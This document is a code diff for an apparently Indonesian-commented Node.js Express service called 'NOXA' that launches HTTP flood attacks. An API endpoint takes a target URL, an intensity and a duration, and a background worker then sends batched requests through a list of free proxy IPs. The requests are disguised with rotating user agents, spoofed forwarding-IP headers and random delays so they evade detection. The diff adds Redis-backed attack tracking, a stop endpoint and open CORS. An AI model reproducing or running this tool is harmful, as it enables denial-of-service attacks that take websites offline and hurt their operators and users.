@@ -2,22 +2,23 @@ const express = require('express');
 const axios = require('axios');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const { HttpProxyAgent } = require('http-proxy-agent');
-const { 
-    getRandomUserAgent, 
-    getRandomReferer, 
-    getRandomLanguage,
-    getRandomAccept,
-    generateRandomIP,
-    generateXForwardedFor
-} = require('../utils/agents');
+const { v4: uuidv4 } = require('uuid');
+const Redis = require('ioredis');
 
 const app = express();
 app.use(express.json());
+app.use(require('cors')());
 
-// Database proxy gratis (real-time)
+// Redis connection (gunakan Redis gratis dari Redis Cloud atau Upstash)
+const redis = new Redis(process.env.REDIS_URL || 'redis://localhost:6379');
+
+// User Agents Database
+const userAgents = require('../utils/agents');
+
+// Updated proxy list (Jan 2026)
 const freeProxies = [
     'http://45.77.56.109:3128',
-    'http://103.141.143.102:4153',
+    'http://103.141.143.102:4153', 
     'http://190.109.168.217:8080',
     'http://154.236.189.13:1976',
     'http://103.166.154.33:3125',
@@ -25,163 +26,235 @@ const freeProxies = [
     'http://186.121.235.66:8080',
     'http://103.48.68.34:83',
     'http://190.97.233.18:999',
-    'http://45.224.119.37:999'
+    'http://45.224.119.37:999',
+    'http://103.155.217.1:4145',
+    'http://123.205.68.113:8192'
 ];
 
-// Cache untuk tracking attack
-const activeAttacks = new Map();
-
-async function makeRequest(targetUrl, attackId) {
+async function makeStealthRequest(targetUrl, requestId) {
     try {
+        // Random proxy selection
         const proxyUrl = freeProxies[Math.floor(Math.random() * freeProxies.length)];
+        
+        // Human-like delay
+        await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 500));
+        
+        const headers = {
+            'User-Agent': userAgents.getRandomUserAgent(),
+            'Accept': userAgents.getRandomAccept(),
+            'Accept-Language': userAgents.getRandomLanguage(),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Referer': userAgents.getRandomReferer(),
+            'Connection': 'keep-alive',
+            'Cache-Control': 'no-cache',
+            'Upgrade-Insecure-Requests': '1',
+            'X-Forwarded-For': userAgents.generateXForwardedFor(),
+            'X-Real-IP': userAgents.generateRandomIP(),
+            'X-Request-ID': requestId,
+            'X-Custom-Header': `NOXA-${Date.now()}`
+        };
+
         const agent = targetUrl.startsWith('https') 
             ? new HttpsProxyAgent(proxyUrl)
             : new HttpProxyAgent(proxyUrl);
-        
-        const headers = {
-            'User-Agent': getRandomUserAgent(),
-            'Accept': getRandomAccept(),
-            'Accept-Language': getRandomLanguage(),
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Referer': getRandomReferer(),
-            'DNT': Math.random() > 0.5 ? '1' : '0',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'cross-site',
-            'Sec-Fetch-User': '?1',
-            'Cache-Control': 'max-age=0',
-            'X-Forwarded-For': generateXForwardedFor(),
-            'X-Real-IP': generateRandomIP(),
-            'X-Client-IP': generateRandomIP(),
-            'CF-Connecting-IP': generateRandomIP(),
-            'True-Client-IP': generateRandomIP()
-        };
 
-        // Random delay untuk simulasi human
-        await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 500));
-        
         const response = await axios.get(targetUrl, {
             headers,
             httpsAgent: agent,
             httpAgent: agent,
             timeout: 10000,
-            validateStatus: () => true // Accept semua status
+            maxRedirects: 3,
+            validateStatus: () => true
         });
         
         return {
             success: true,
             status: response.status,
             proxy: proxyUrl,
-            userAgent: headers['User-Agent'].substring(0, 50) + '...'
+            userAgent: headers['User-Agent'].substring(0, 30),
+            responseTime: Date.now()
         };
+        
     } catch (error) {
         return {
             success: false,
-            error: error.message
+            error: error.message,
+            responseTime: Date.now()
         };
     }
 }
 
+// Start Attack Endpoint
 app.post('/api/attack', async (req, res) => {
-    const { url, intensity, duration } = req.body;
+    try {
+        console.log('Attack request received:', req.body);
+        
+        const { url, intensity = 50, duration = 60 } = req.body;
+        
+        if (!url || !url.startsWith('http')) {
+            return res.status(400).json({ 
+                success: false, 
+                error: 'Invalid URL format. Must start with http:// or https://' 
+            });
+        }
+        
+        const attackId = `attack_${uuidv4().replace(/-/g, '')}`;
+        const intensityNum = Math.min(Math.max(parseInt(intensity), 10), 200);
+        const durationNum = Math.min(Math.max(parseInt(duration), 30), 1800);
+        
+        // Store attack data in Redis
+        const attackData = {
+            id: attackId,
+            url,
+            intensity: intensityNum,
+            startTime: Date.now(),
+            endTime: Date.now() + (durationNum * 1000),
+            requestsSent: 0,
+            requestsSuccess: 0,
+            requestsFailed: 0,
+            active: true,
+            lastUpdate: Date.now()
+        };
+        
+        await redis.setex(`attack:${attackId}`, 7200, JSON.stringify(attackData));
+        
+        // Start attack in background (async)
+        startAttackWorker(attackId, url, intensityNum, durationNum);
+        
+        res.json({
+            success: true,
+            attackId,
+            message: `🚀 Attack launched against ${url}`,
+            intensity: intensityNum,
+            duration: durationNum,
+            estimatedRequests: intensityNum * durationNum,
+            monitorUrl: `/api/status/${attackId}`
+        });
+        
+    } catch (error) {
+        console.error('Attack error:', error);
+        res.status(500).json({ 
+            success: false, 
+            error: error.message 
+        });
+    }
+});
+
+// Stop Attack Endpoint
+app.post('/api/stop/:id', async (req, res) => {
+    try {
+        const attackId = req.params.id;
+        const attackData = await redis.get(`attack:${attackId}`);
+        
+        if (!attackData) {
+            return res.status(404).json({ 
+                success: false, 
+                error: 'Attack not found' 
+            });
+        }
+        
+        const attack = JSON.parse(attackData);
+        attack.active = false;
+        attack.completedAt = Date.now();
+        
+        await redis.setex(`attack:${attackId}`, 3600, JSON.stringify(attack));
+        
+        res.json({
+            success: true,
+            message: 'Attack stopped successfully',
+            attackId,
+            totalRequests: attack.requestsSent,
+            successRate: ((attack.requestsSuccess / attack.requestsSent) * 100).toFixed(2)
+        });
+        
+    } catch (error) {
+        res.status(500).json({ 
+            success: false, 
+            error: error.message 
+        });
+    }
+});
+
+// Background attack worker
+async function startAttackWorker(attackId, targetUrl, intensity, durationSeconds) {
+    console.log(`[NOXA] Starting attack worker ${attackId}`);
     
-    // Validasi input
-    if (!url || !url.startsWith('http')) {
-        return res.status(400).json({ error: 'URL tidak valid' });
+    const endTime = Date.now() + (durationSeconds * 1000);
+    const batchSize = Math.min(intensity, 15);
+    
+    while (Date.now() < endTime) {
+        try {
+            const attackData = await redis.get(`attack:${attackId}`);
+            if (!attackData) break;
+            
+            const attack = JSON.parse(attackData);
+            if (!attack.active) break;
+            
+            // Send batch requests
+            const batchPromises = [];
+            for (let i = 0; i < batchSize; i++) {
+                batchPromises.push(
+                    makeStealthRequest(targetUrl, `${attackId}_${Date.now()}_${i}`)
+                );
+            }
+            
+            const results = await Promise.allSettled(batchPromises);
+            
+            // Update stats
+            attack.requestsSent += batchSize;
+            attack.requestsSuccess += results.filter(r => 
+                r.status === 'fulfilled' && r.value.success
+            ).length;
+            attack.requestsFailed += results.filter(r => 
+                r.status === 'rejected' || (r.status === 'fulfilled' && !r.value.success)
+            ).length;
+            attack.lastUpdate = Date.now();
+            
+            await redis.setex(`attack:${attackId}`, 7200, JSON.stringify(attack));
+            
+        } catch (error) {
+            console.error(`Worker error for ${attackId}:`, error.message);
+        }
+        
+        // Rate limiting
+        const delay = Math.max(50, 1000 / intensity);
+        await new Promise(resolve => setTimeout(resolve, delay));
     }
     
-    const attackId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
-    const intensityLevel = parseInt(intensity) || 100;
-    const durationSeconds = parseInt(duration) || 60;
+    // Mark as completed
+    try {
+        const attackData = await redis.get(`attack:${attackId}`);
+        if (attackData) {
+            const attack = JSON.parse(attackData);
+            attack.active = false;
+            attack.completedAt = Date.now();
+            await redis.setex(`attack:${attackId}`, 3600, JSON.stringify(attack));
+        }
+    } catch (error) {
+        console.error('Completion error:', error);
+    }
     
-    // Simpan attack ke cache
-    activeAttacks.set(attackId, {
-        url,
-        intensity: intensityLevel,
-        startTime: Date.now(),
-        endTime: Date.now() + (durationSeconds * 1000),
-        requestsSent: 0,
-        requestsSuccess: 0,
-        requestsFailed: 0
-    });
-    
-    // Mulai attack di background
-    startAttack(attackId, url, intensityLevel, durationSeconds);
-    
+    console.log(`[NOXA] Attack worker ${attackId} completed`);
+}
+
+// Fallback endpoint for GET requests
+app.get('/api/attack', (req, res) => {
     res.json({
-        success: true,
-        attackId,
-        message: `Attack dimulai ke ${url}`,
-        intensity: intensityLevel,
-        duration: durationSeconds,
-        estimatedRequests: intensityLevel * durationSeconds
+        message: 'NOXA Attack API',
+        usage: 'Send POST request with {url, intensity, duration}',
+        example: {
+            url: 'https://example.com',
+            intensity: 100,
+            duration: 60
+        }
     });
 });
 
-async function startAttack(attackId, targetUrl, intensity, durationSeconds) {
-    const endTime = Date.now() + (durationSeconds * 1000);
-    const requestsPerSecond = intensity;
-    
-    console.log(`[NOXA] Starting attack ${attackId} on ${targetUrl}`);
-    
-    while (Date.now() < endTime) {
-        const attackInfo = activeAttacks.get(attackId);
-        if (!attackInfo) break;
-        
-        // Kirim batch request
-        const promises = [];
-        for (let i = 0; i < requestsPerSecond; i++) {
-            promises.push(makeRequest(targetUrl, attackId));
-        }
-        
-        try {
-            const results = await Promise.allSettled(promises);
-            
-            // Update stats
-            attackInfo.requestsSent += requestsPerSecond;
-            attackInfo.requestsSuccess += results.filter(r => r.status === 'fulfilled' && r.value.success).length;
-            attackInfo.requestsFailed += results.filter(r => r.status === 'rejected' || (r.status === 'fulfilled' && !r.value.success)).length;
-            
-            activeAttacks.set(attackId, attackInfo);
-        } catch (error) {
-            console.error('Batch error:', error.message);
-        }
-        
-        // Delay 1 detik antara batch
-        await new Promise(resolve => setTimeout(resolve, 1000));
-    }
-    
-    console.log(`[NOXA] Attack ${attackId} completed`);
-    // Hapus setelah 5 menit
-    setTimeout(() => activeAttacks.delete(attackId), 300000);
-}
-
-app.get('/api/attack/:id', (req, res) => {
-    const attackId = req.params.id;
-    const attackInfo = activeAttacks.get(attackId);
-    
-    if (!attackInfo) {
-        return res.status(404).json({ error: 'Attack tidak ditemukan' });
-    }
-    
-    const elapsed = Date.now() - attackInfo.startTime;
-    const remaining = Math.max(0, attackInfo.endTime - Date.now());
-    
-    res.json({
-        attackId,
-        url: attackInfo.url,
-        intensity: attackInfo.intensity,
-        elapsedTime: Math.floor(elapsed / 1000),
-        remainingTime: Math.floor(remaining / 1000),
-        requestsSent: attackInfo.requestsSent,
-        requestsSuccess: attackInfo.requestsSuccess,
-        requestsFailed: attackInfo.requestsFailed,
-        successRate: attackInfo.requestsSent > 0 
-            ? ((attackInfo.requestsSuccess / attackInfo.requestsSent) * 100).toFixed(2)
-            : 0
-    });
+// Handle OPTIONS for CORS
+app.options('/api/attack', (req, res) => {
+    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type');
+    res.sendStatus(200);
 });
 
 module.exports = app;
